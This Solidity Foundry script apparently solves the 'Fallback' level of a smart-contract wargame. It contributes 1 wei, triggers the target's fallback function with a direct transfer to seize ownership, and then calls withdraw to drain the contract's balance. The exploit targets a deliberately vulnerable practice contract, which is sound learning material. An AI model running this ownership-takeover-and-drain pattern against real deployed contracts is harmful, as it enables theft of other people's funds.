// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Fallback.sol";

contract Level1Solution is Script{

Fallback public fallback1 = Fallback(payable(0x900D3b9C92890d0Eb85B4B7b812f8d000Bd44F4F));

function run() external
    {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        fallback1.contribute{value: 1 wei}();
        address(fallback1).call{value: 1 wei}("");
        console.log("my:" ,vm.envAddress("MY_ADDRESS"));
        console.log("new:" ,fallback1.owner());
        fallback1.withdraw();
        console.log("ether :", address(fallback1).balance);
        vm.stopBroadcast();
    }

}
